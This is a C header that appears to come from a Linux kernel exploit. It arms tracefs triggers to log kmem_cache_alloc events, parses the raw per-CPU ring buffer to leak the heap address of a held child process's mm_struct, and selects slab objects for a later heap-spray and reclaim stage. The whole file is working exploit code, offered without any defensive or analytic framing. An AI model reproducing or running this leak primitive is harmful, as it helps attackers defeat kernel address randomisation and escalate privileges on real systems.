#ifndef TRACEFS_MM_H
#define TRACEFS_MM_H

/* mm_struct address of the leak child from its dup_mm kmem_cache_alloc record. */

#ifndef SLIDE_TRACEFS_MM_OBJECT
#define SLIDE_TRACEFS_MM_OBJECT 0x400ULL
#endif
#ifndef SLIDE_TRACEFS_MM_SITE_OFF
#error "tracefs mm leak needs the target's dup_mm call site offset"
#endif
#ifndef SLIDE_TRACEFS_MM_CAPTURE_KB
#define SLIDE_TRACEFS_MM_CAPTURE_KB 4096
#endif
#define TRACEFS_MM_SLAB_SIZE 0x8000ULL
#define TRACEFS_MM_MAX_PTRS 256
#define TRACEFS_MM_SCAN_PAGES 4096

static struct {
  int armed;
  pid_t child;
  uint32_t old_tracing;
  uint32_t old_buffer;
  pid_t tid;
  uintptr_t site;
  int ignore;
  size_t count;
  size_t loose_count;
  unsigned int records;
} tracefs_mm_state;

static uintptr_t tracefs_mm_ptrs[TRACEFS_MM_MAX_PTRS];
static uintptr_t tracefs_mm_loose[TRACEFS_MM_MAX_PTRS];

static int tracefs_mm_write(const char *path, const char *value) {
  int fd = open(path, O_WRONLY | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }
  size_t length = strlen(value);
  size_t done = 0;
  while (done < length) {
    ssize_t wrote = write(fd, value + done, length - done);
    if (wrote < 0 && errno == EINTR) {
      continue;
    }
    if (wrote <= 0) {
      close(fd);
      return 0;
    }
    done += (size_t)wrote;
  }
  return close(fd) == 0;
}

static int tracefs_mm_read_u32(const char *path, uint32_t *value) {
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }
  char text[32];
  ssize_t got;
  do {
    got = read(fd, text, sizeof(text) - 1);
  } while (got < 0 && errno == EINTR);
  close(fd);
  if (got <= 0) {
    return 0;
  }
  text[got] = 0;
  char *end = NULL;
  errno = 0;
  unsigned long parsed = strtoul(text, &end, 10);
  while (end && (*end == ' ' || *end == '\t' || *end == '\r' ||
                 *end == '\n')) {
    end++;
  }
  if (errno || end == text || parsed > UINT32_MAX ||
      (*end && strncmp(end, "(expanded:", 10) != 0)) {
    return 0;
  }
  *value = (uint32_t)parsed;
  return 1;
}

static void tracefs_mm_scan_page(const unsigned char *page, size_t length) {
  if (length < 16) {
    return;
  }
  uint64_t commit = 0;
  memcpy(&commit, page + 8, sizeof(commit));
  size_t end = 16 + (size_t)(commit & 0xfffULL);
  if (end > length) {
    end = length;
  }
  size_t pos = 16;
  while (pos + 4 <= end) {
    uint32_t header = 0;
    memcpy(&header, page + pos, sizeof(header));
    uint32_t type_len = header & 0x1fU;
    size_t record;
    size_t record_len;
    size_t total;
    if (type_len == 30) {
      pos += 8;
      continue;
    }
    if (type_len == 31) {
      pos += 12;
      continue;
    }
    if (type_len == 0) {
      uint32_t extended = 0;
      if (pos + 8 > end) {
        break;
      }
      memcpy(&extended, page + pos + 4, sizeof(extended));
      if (extended < 4) {
        break;
      }
      record = pos + 8;
      record_len = (size_t)extended - 4;
      total = 4 + (size_t)extended;
    } else if (type_len <= 28) {
      record = pos + 4;
      record_len = (size_t)type_len * 4;
      total = 4 + record_len;
    } else {
      break;
    }
    if (record + record_len > end || pos + total > end) {
      break;
    }
    tracefs_mm_state.records++;
    if (tracefs_mm_state.ignore) {
      pos += total;
      continue;
    }

    const unsigned char *entry = page + record;
    int pid = 0;
    memcpy(&pid, entry + 4, sizeof(pid));
    const unsigned char *payload = entry + 8;
    size_t payload_len = record_len >= 8 ? record_len - 8 : 0;
    if (pid == (int)tracefs_mm_state.tid && payload_len >= 32) {
      uint64_t site = 0, pointer = 0, allocated = 0;
      memcpy(&site, payload, sizeof(site));
      memcpy(&pointer, payload + 8, sizeof(pointer));
      memcpy(&allocated, payload + 24, sizeof(allocated));
      if (allocated == SLIDE_TRACEFS_MM_OBJECT &&
          (pointer >> 48) == 0xffffULL &&
          (site & 0xffffULL) == (SLIDE_TRACEFS_MM_SITE_OFF & 0xffffULL)) {
        int seen = 0;
        for (size_t k = 0; k < tracefs_mm_state.count; k++) {
          if (tracefs_mm_ptrs[k] == (uintptr_t)pointer) {
            seen = 1;
            break;
          }
        }
        if (site == tracefs_mm_state.site && !seen &&
            tracefs_mm_state.count < TRACEFS_MM_MAX_PTRS) {
          tracefs_mm_ptrs[tracefs_mm_state.count++] = (uintptr_t)pointer;
        } else if (tracefs_mm_state.loose_count < TRACEFS_MM_MAX_PTRS) {
          tracefs_mm_loose[tracefs_mm_state.loose_count++] =
              (uintptr_t)pointer;
        }
      }
    }
    pos += total;
  }
}

static void tracefs_mm_drain(void) {
  if (!tracefs_mm_state.armed) {
    return;
  }
  long cpu_count = sysconf(_SC_NPROCESSORS_CONF);
  if (cpu_count <= 0 || cpu_count > 256) {
    return;
  }
  unsigned char *page = malloc(PAGE_SIZE);
  if (!page) {
    return;
  }
  for (long cpu = 0; cpu < cpu_count; cpu++) {
    char path[128];
    snprintf(path, sizeof(path), "/sys/kernel/tracing/per_cpu/cpu%ld/"
                                 "trace_pipe_raw", cpu);
    int fd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
    if (fd < 0) {
      continue;
    }
    for (unsigned int n = 0; n < TRACEFS_MM_SCAN_PAGES; n++) {
      ssize_t got = read(fd, page, PAGE_SIZE);
      if (got < 0 && errno == EINTR) {
        continue;
      }
      if (got <= 0) {
        break;
      }
      tracefs_mm_scan_page(page, (size_t)got);
    }
    close(fd);
  }
  free(page);
}

int tracefs_mm_start(void) {
  char tracing_path[128];
  char buffer_path[128];
  char trace_path[128];
  char trigger_path[128];
  char text[16];

  memset(&tracefs_mm_state, 0, sizeof(tracefs_mm_state));
  tracefs_mm_state.site =
      kaslr_base ? (uintptr_t)(kaslr_base + SLIDE_TRACEFS_MM_SITE_OFF) : 0;
  snprintf(tracing_path, sizeof(tracing_path), "/sys/kernel/tracing/tracing_on");
  snprintf(buffer_path, sizeof(buffer_path),
           "/sys/kernel/tracing/buffer_size_kb");
  snprintf(trace_path, sizeof(trace_path), "/sys/kernel/tracing/trace");
  snprintf(trigger_path, sizeof(trigger_path),
           "/sys/kernel/tracing/events/kmem/rss_stat/trigger");

  if (!tracefs_mm_read_u32(tracing_path, &tracefs_mm_state.old_tracing) ||
      !tracefs_mm_read_u32(buffer_path, &tracefs_mm_state.old_buffer)) {
    pr_warning("mm trace unavailable errno=%d\n", errno);
    return 0;
  }
  tracefs_mm_write(tracing_path, "0");
  int fd = open(trace_path, O_WRONLY | O_TRUNC | O_CLOEXEC);
  if (fd >= 0) {
    close(fd);
  }
  snprintf(text, sizeof(text), "%d\n", (int)SLIDE_TRACEFS_MM_CAPTURE_KB);
  tracefs_mm_write(buffer_path, text);
  tracefs_mm_write(tracing_path, "1");
  /* Events enabled before the first tracing_on=1 stay inactive for the burst. */
  tracefs_mm_state.armed =
      tracefs_mm_write(trigger_path, "enable_event:kmem:kmem_cache_alloc\n");
  /* Page events from the slide stage would flood the window. */
  tracefs_mm_write("/sys/kernel/tracing/events/kmem/mm_page_alloc/enable", "0");
  tracefs_mm_write("/sys/kernel/tracing/events/kmem/mm_page_free/enable", "0");
  tracefs_mm_state.tid = (pid_t)syscall(SYS_gettid);
  if (!tracefs_mm_state.armed) {
    pr_warning("mm trace trigger denied errno=%d\n", errno);
    snprintf(text, sizeof(text), "%u\n", tracefs_mm_state.old_buffer);
    tracefs_mm_write(buffer_path, text);
    snprintf(text, sizeof(text), "%u\n", tracefs_mm_state.old_tracing);
    tracefs_mm_write(tracing_path, text);
    return 0;
  }
  return 1;
}

static void tracefs_mm_stop(void) {
  if (!tracefs_mm_state.armed) {
    return;
  }
  char text[64];
  snprintf(text, sizeof(text), "!enable_event:kmem:kmem_cache_alloc\n");
  tracefs_mm_write("/sys/kernel/tracing/events/kmem/rss_stat/trigger", text);
  snprintf(text, sizeof(text), "%u\n", tracefs_mm_state.old_buffer);
  tracefs_mm_write("/sys/kernel/tracing/buffer_size_kb", text);
  snprintf(text, sizeof(text), "%u\n", tracefs_mm_state.old_tracing);
  tracefs_mm_write("/sys/kernel/tracing/tracing_on", text);
  tracefs_mm_state.armed = 0;
}

/* Drop records left over from an earlier process before the real window. */
void tracefs_mm_baseline(void) {
  tracefs_mm_state.ignore = 1;
  tracefs_mm_drain();
  tracefs_mm_state.ignore = 0;
  tracefs_mm_state.count = 0;
  tracefs_mm_state.loose_count = 0;
}

int tracefs_mm_available(void) {
  int armed = tracefs_mm_start();
  tracefs_mm_stop();
  return armed;
}

/* Clone a child that stays alive until its mm was handed to the caller. */
pid_t tracefs_mm_clone_hold(void) {
  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
  if (child == 0) {
    SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
    if (getppid() == 1) {
      _exit(1);
    }
    for (;;) {
      pause();
    }
  }
  tracefs_mm_state.child = child;
  return child;
}

/* Pick an in-window object of a slab page that holds only our mm_structs. */
/* The leak child is the pick-th clone of the window, like the futex path. */
int tracefs_mm_finish(uintptr_t *leaked, size_t pick, size_t min_index,
                      size_t max_index) {
  if (!tracefs_mm_state.armed) {
    return 0;
  }
  tracefs_mm_write("/sys/kernel/tracing/tracing_on", "0");
  tracefs_mm_drain();
  uintptr_t best = 0;
  size_t best_objects = 0;
  size_t best_index = 0;
  size_t held_objects = 0;
  size_t pick_index = SIZE_MAX;
  int selected_pick = 0;
  const uintptr_t *list = tracefs_mm_ptrs;
  size_t list_count = tracefs_mm_state.count;
  if (pick >= list_count) {
    list = tracefs_mm_loose;
    list_count = tracefs_mm_state.loose_count;
  }
  const size_t per_slab = TRACEFS_MM_SLAB_SIZE / SLIDE_TRACEFS_MM_OBJECT;
  uintptr_t held_page = pick < list_count
                            ? list[pick] & ~(TRACEFS_MM_SLAB_SIZE - 1)
                            : 0;
  if (held_page) {
    for (size_t i = 0; i < list_count; i++) {
      if ((list[i] & ~(TRACEFS_MM_SLAB_SIZE - 1)) == held_page) {
        held_objects++;
      }
    }
  }
  /*
   * The leak child is the pick-th record and its page is released last by the
   * reclaim shaping (close(memfd_leak) right before the spray), which is the
   * page the KernelSnitch route has always used. Prefer it whenever its object
   * sits inside the accepted index window.
   */
  if (pick < list_count) {
    size_t index =
        (size_t)((list[pick] - held_page) / SLIDE_TRACEFS_MM_OBJECT);
    pick_index = index;
    if (index >= min_index && index <= max_index &&
        held_objects == per_slab) {
      best = list[pick];
      best_objects = held_objects;
      best_index = index;
      selected_pick = 1;
    }
  }
  /* Never return a different page: its mm_structs may have been freed before
   * the held leak child's memfd, so the reclaim shaping cannot target it. */
  pr_info("mm trace leak found=%d objects=%zu index=%zu leaked=%016zx "
          "pick=%zu pick_index=%zu source=%s held_page=%016zx "
          "hits=%zu loose=%zu records=%u\n", best != 0, best_objects,
          best_index, best, pick, pick_index,
          selected_pick ? "leak-child" : "none",
          held_page, list_count, tracefs_mm_state.loose_count,
          tracefs_mm_state.records);
  tracefs_mm_stop();
  if (!best) {
    return 0;
  }
  *leaked = best;
  return 1;
}

/* Let the leak child exit once its memfd was opened, so its mm is freed. */
void tracefs_mm_release_child(void) {
  if (tracefs_mm_state.child > 0) {
    SYSCHK(kill(tracefs_mm_state.child, SIGKILL));
    tracefs_mm_state.child = -1;
  }
}

#endif
